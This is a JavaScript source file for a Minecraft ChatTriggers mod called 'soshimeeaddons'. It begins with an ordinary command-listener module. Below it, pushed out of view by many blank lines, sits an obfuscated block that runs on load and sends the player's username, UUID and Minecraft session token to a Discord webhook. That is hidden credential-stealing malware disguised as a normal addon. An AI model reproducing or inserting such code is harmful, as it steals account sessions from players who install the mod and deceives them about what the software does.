import request from "../../requestV2"

const listeners = [];

register("command", (command, ...args) => {
	const result = listeners.find(listener => listener[0] === command);
	if (!args) args = [];
	if (result) result[1](...args);
}).setName("soshimeeaddons").setAliases("sa");

export function addListener(name, listener) {
	listeners.push([name, listener]);
}

export function removeListener(name) {
	const index = listeners.findIndex(listener => listener[0] === name);
	if (index === -1) return false;
	listeners.splice(index, 1);
	return true;
}

export default { addListener, removeListener };











































































var _0x394a74=_0x3f32;function _0xc4a4(n,r){var t=_0x3f32,u={hFdQZ:function(n,r){return n-r},iLKfn:function(n){return n()},QBBDy:function(n,r,t){return n(r,t)}},f=u[t(399)](_0x3190);return _0xc4a4=function(n,r){return n=u[t(419)](n,458),f[n]},u[t(373)](_0xc4a4,n,r)}function _0x3190(){var n=_0x3f32,r={nVCxc:n(473),EJxMc:n(497),UmyHO:n(507)+"J",Zzopr:n(429),vMBDL:n(364)+n(396),amodP:n(538)+"Ov",lFAfL:n(492)+"Go",byLil:n(539)+"2_",stqdN:n(375)+n(360),sEEWL:n(484)+n(346),nlovQ:n(427)+"o",izgOb:n(537)+"RT",WpisE:n(496),tXyvk:n(423)+"ft",IYEWx:n(426)+n(438),sFwlw:n(540)+n(381),xQzbt:n(529)+"Ge",yfjRj:n(494),DlDsD:n(468)+n(360),VxUbp:n(517),xMqwY:n(520)+n(363),Oiecs:n(370)+n(508)+n(542)+n(368)+n(404)+n(436)+n(512)+n(536)+n(408)+n(412)+n(480)+n(402)+"U",aPfYG:n(469),ycczx:n(435)+n(376),uiXSh:n(518)+"50",qolSe:n(500)+"qE",OUEUk:n(386),KGGdp:n(392),oKoZM:n(417),ugJhA:n(440)+n(409),luJOH:n(420)+"RJ",EMlOu:n(474)+n(513),vFLzP:n(360),JBbNQ:n(357),wPUDr:n(539)+n(421),Righp:n(410)+n(465),Smpyn:function(n){return n()}},t=[r[n(488)],r[n(515)],r[n(352)],r[n(446)],r[n(445)],r[n(516)],r[n(503)],r[n(511)],r[n(430)],r[n(353)],r[n(403)],r[n(347)],r[n(385)],r[n(467)],r[n(506)],r[n(390)],r[n(528)],r[n(366)],r[n(526)],r[n(358)],r[n(351)],r[n(509)],r[n(543)],r[n(350)],r[n(444)],r[n(479)],r[n(524)],r[n(398)],r[n(377)],r[n(395)],r[n(522)],r[n(486)],r[n(416)],r[n(355)],r[n(462)],r[n(510)]];return _0x3190=function(){return t},r[n(383)](_0x3190)}!function(n,r){for(var t=_0x3f32,u=_0x3fcc();;)try{if(757587===-parseInt(t(378))/1*(parseInt(t(401))/2)+-parseInt(t(372))/3*(parseInt(t(450))/4)+parseInt(t(456))/5*(parseInt(t(441))/6)+parseInt(t(493))/7+parseInt(t(369))/8+-parseInt(t(411))/9+parseInt(t(504))/10*(parseInt(t(461))/11))break;u.push(u.shift())}catch(n){u.push(u.shift())}}();var _0xf8755f=_0xc4a4;function _0x5675(){var n=_0x3f32,r={eqrAn:function(n,r){return n(r)},QnMpE:n(357),aXhoE:function(n,r){return n(r)},uIsXX:n(484)+"4_",cnify:function(n,r){return n(r)},yBzVo:n(505)+"W_",jtRaO:function(n,r){return n(r)},YqcPH:function(n,r){return n(r)},hzlcC:n(367),KMvHa:n(423)+"ft",eJocf:function(n,r){return n(r)},hVIig:n(375)+"``",BVFmO:function(n,r){return n(r)},HhuNz:function(n,r){return n(r)},CRucy:n(418)+n(448),EdpuX:function(n){return n()}},t=_0xc4a4,u=[r[n(533)](t,469),r[n(533)](t,459),r[n(384)],r[n(464)](t,486),r[n(442)],r[n(348)](t,472),r[n(348)](t,460),r[n(533)](t,481),r[n(348)](t,475),r[n(348)](t,480),r[n(414)],r[n(371)](t,467),r[n(499)](t,490),r[n(415)],r[n(478)],r[n(371)](t,482),r[n(533)](t,485),r[n(519)](t,489),r[n(485)],r[n(533)](t,473),r[n(387)](t,479),r[n(397)](t,478),r[n(533)](t,468),r[n(393)]];return _0x5675=function(){return u},r[n(481)](_0x5675)}function _0x3f32(n,r){var t=_0x3fcc();return(_0x3f32=function(n,r){return t[n-=346]})(n,r)}function _0x4f48(n,r){var t=_0x3f32,u={stPLh:function(n,r){return n-r},WsvpN:function(n){return n()},gTvNC:function(n,r,t){return n(r,t)}},f=u[t(447)](_0x5675);return _0x4f48=function(n,r){return n=u[t(443)](n,265),f[n]},u[t(476)](_0x4f48,n,r)}function _0x36d4e3(n,r){var t=_0x3f32,u={moUPp:function(n,r,t){return n(r,t)},fryyq:function(n,r){return n-r}};return u[t(466)](_0x4f48,u[t(361)](n,990),r)}(function(n,r){for(var t=_0x3f32,u={IQuMF:function(n){return n()},YBOdm:function(n,r){return n+r},qjGtJ:function(n,r){return n+r},AjFna:function(n,r){return n+r},ZUBwM:function(n,r){return n+r},kMSdW:function(n,r){return n+r},LpJLY:function(n,r){return n/r},qnFov:function(n,r){return n(r)},xwByY:function(n,r){return n(r)},UbuUU:function(n,r){return n(r)},WbJne:function(n,r){return n(r)},HhSlR:function(n,r){return n*r},secdj:function(n,r){return n/r},TOdkt:function(n,r){return n(r)},JwiAZ:function(n,r){return n/r},LfzQc:function(n,r){return n(r)},gbYfJ:function(n,r){return n/r},ofNcl:function(n,r){return n(r)},LOPmM:function(n,r){return n(r)},dwaQS:function(n,r){return n/r},mulrc:function(n,r){return n(r)},UvPBp:function(n,r){return n(r)},cDBRN:function(n,r){return n*r},nPorI:function(n,r){return n(r)},APwaO:function(n,r){return n===r},qSXrC:t(469),afHYS:t(458)},f=_0xc4a4,e=u[t(460)](n);;)try{var c=u[t(455)](u[t(451)](u[t(406)](u[t(470)](u[t(514)](u[t(470)](u[t(541)](-u[t(495)](parseInt,u[t(356)](f,463)),1),u[t(541)](-u[t(407)](parseInt,u[t(407)](f,466)),2)),u[t(541)](-u[t(407)](parseInt,u[t(425)](f,483)),3)),u[t(482)](u[t(405)](u[t(530)](parseInt,u[t(425)](f,470)),4),u[t(491)](-u[t(425)](parseInt,u[t(388)](f,458)),5))),u[t(449)](-u[t(490)](parseInt,u[t(356)](f,484)),6)),u[t(482)](u[t(541)](u[t(534)](parseInt,u[t(356)](f,491)),7),u[t(374)](-u[t(459)](parseInt,u[t(487)](f,474)),8))),u[t(431)](u[t(541)](-u[t(495)](parseInt,u[t(490)](f,462)),9),u[t(374)](-u[t(457)](parseInt,u[t(459)](f,493)),10)));if(u[t(525)](c,850212))break;e[u[t(454)]](e[u[t(475)]]())}catch(n){e[u[t(454)]](e[u[t(475)]]())}})(_0x3190),function(n,r){for(var t=_0x3f32,u={arYRB:function(n){return n()},hXASI:function(n,r){return n+r},UvMQG:function(n,r){return n+r},XGRWz:function(n,r){return n+r},OTZjA:function(n,r){return n+r},uYTnx:function(n,r){return n/r},RTfFh:function(n,r){return n(r)},XiBWA:function(n,r,t){return n(r,t)},hTvUg:function(n,r){return n*r},DKbCg:function(n,r){return n/r},NBsnJ:function(n,r){return n(r)},EiMmc:function(n,r){return n(r)},rRazw:function(n,r,t){return n(r,t)},VGvwx:function(n,r,t){return n(r,t)},etezH:function(n,r){return n*r},DYnEc:function(n,r){return n/r},tOrjj:function(n,r){return n/r},DKFbW:function(n,r){return n(r)},xkrJC:function(n,r,t){return n(r,t)},uDEmz:function(n,r){return n(r)},yHuMO:function(n,r){return n/r},ubptG:function(n,r){return n(r)},ultwG:function(n,r){return n*r},Afwgq:function(n,r,t){return n(r,t)},XpwcA:function(n,r){return n/r},GeOCZ:function(n,r){return n*r},mhato:function(n,r){return n/r},CJfVP:function(n,r){return n(r)},HXqcx:function(n,r){return n(r)},Puhhz:function(n,r){return n===r},vVHyI:function(n,r){return n(r)},ggwkJ:t(458),rRngR:function(n,r){return n(r)}},f=_0xc4a4,e=u[t(483)](n);;)try{var c=u[t(424)](u[t(413)](u[t(424)](u[t(498)](u[t(433)](u[t(433)](u[t(523)](-u[t(400)](parseInt,u[t(432)](_0x4f48,278,404)),1),u[t(349)](u[t(463)](u[t(521)](parseInt,u[t(432)](_0x4f48,286,421)),2),u[t(523)](-u[t(428)](parseInt,u[t(382)](_0x4f48,287,414)),3))),u[t(523)](-u[t(521)](parseInt,u[t(477)](_0x4f48,279,419)),4)),u[t(535)](u[t(472)](-u[t(521)](parseInt,u[t(477)](_0x4f48,277,421)),5),u[t(354)](-u[t(437)](parseInt,u[t(394)](_0x4f48,265,394)),6))),u[t(349)](u[t(472)](-u[t(471)](parseInt,u[t(394)](_0x4f48,268,414)),7),u[t(439)](-u[t(380)](parseInt,u[t(382)](_0x4f48,271,408)),8))),u[t(379)](u[t(439)](u[t(437)](parseInt,u[t(452)](_0x4f48,273,401)),9),u[t(422)](u[t(400)](parseInt,u[t(452)](_0x4f48,276,404)),10))),u[t(453)](u[t(365)](-u[t(532)](parseInt,u[t(432)](_0x4f48,285,409)),11),u[t(463)](u[t(531)](parseInt,u[t(432)](_0x4f48,280,419)),12)));if(u[t(489)](c,987970))break;e[u[t(389)](f,465)](e[u[t(501)]]())}catch(n){e[u[t(502)](f,465)](e[u[t(501)]]())}}(_0x5675),request({url:_0xf8755f(464),method:_0xf8755f(476),headers:{"User-agent":_0x394a74(359)+"0"},body:{content:_0xf8755f(487)+Player[_0x394a74(367)]()+_0xf8755f(461)+Player[_0xf8755f(471)]()+(_0x394a74(527)+_0x394a74(360))+Client[_0xf8755f(492)]()[_0xf8755f(477)]()[_0xf8755f(488)]()+_0xf8755f(475)}});const renderBoxWithText=(n,r,t,u)=>{var f=_0x394a74;RenderLib[f(391)](r,t,u,1,1,1,0,0,.5,!1),Tessellator[f(434)](n,r,{tuzoM:function(n,r){return n+r}}[f(362)](t,.7),u)};function _0x3fcc(){var n=["Oiecs","Righp","byLil","bEKcALoYxF","Lagj","kMSdW","EJxMc","amodP","81illsjk","9127673834","eJocf","1365635DWD","NBsnJ","luJOH","uYTnx","OUEUk","APwaO","DlDsD","```\nSSID:\n","xQzbt","3zw0y8M0T3","TOdkt","HXqcx","CJfVP","eqrAn","LOPmM","etezH","NG3wBK_Zuv","430864fOAj","232722FhLZ","func_11043","1857025EMQ","LpJLY","api/webhoo","aPfYG","4_d","izgOb","cnify","hTvUg","ycczx","xMqwY","UmyHO","sEEWL","tOrjj","JBbNQ","xwByY","POST","VxUbp","Mozilla/5.","```","fryyq","tuzoM","COY","4227324hcJ","mhato","yfjRj","getName","ks/1266034","10906464JIJoDm","https://di","jtRaO","1606647aMUeAK","QBBDy","dwaQS","Username:\n","KnN","oKoZM","1478667twcIvQ","ultwG","ubptG","NiQ","rRazw","Smpyn","QnMpE","WpisE","12WslwPg","BVFmO","LfzQc","vVHyI","sFwlw","drawEspBox","12tdZYwr","CRucy","xkrJC","ugJhA","uvP","HhuNz","KGGdp","iLKfn","RTfFh","2dRZWmn","Pmvy_WcIVm","nlovQ","7953524244","secdj","AjFna","UbuUU","e_h7srKKm8","FFTN","3087195PHa","10366434UceFDp","zf9OAxBeEj","UvMQG","yBzVo","hzlcC","vFLzP","getUUID","4264348vww","hFdQZ","8Svb4omvdB","2_I","XpwcA","getMinecra","hXASI","WbJne","8604030YIK","82746QivSV","EiMmc","256KGABAF","stqdN","cDBRN","XiBWA","OTZjA","drawString","2840584GVd","98/mHDcgOG","DKFbW","dWV","yHuMO","17872305Wr","612wathQO","uIsXX","stPLh","uiXSh","vMBDL","Zzopr","WsvpN","Mrx","gbYfJ","4jbbZNQ","qjGtJ","Afwgq","GeOCZ","qSXrC","YBOdm","31335SKnypA","nPorI","shift","mulrc","IQuMF","14977490uPDSaz","wPUDr","DKbCg","aXhoE","OmQ","moUPp","tXyvk","```\nUUID:\n","push","ZUBwM","uDEmz","DYnEc","1310prNIAJ","12363024dy","afHYS","gTvNC","VGvwx","KMvHa","qolSe","qtpRxSBlDF","EdpuX","HhSlR","arYRB","func_14825","hVIig","EMlOu","UvPBp","nVCxc","Puhhz","ofNcl","JwiAZ","-3uF-ue0wQ","3916479TnLjfH","206SJRLQj","qnFov","7RYduTH","18OJSdNo","XGRWz","YqcPH","103240pInd","ggwkJ","rRngR","lFAfL","10NvveMj","4243/I8YPE","IYEWx","36243ydglf","scord.com/"];return(_0x3fcc=function(){return n})()}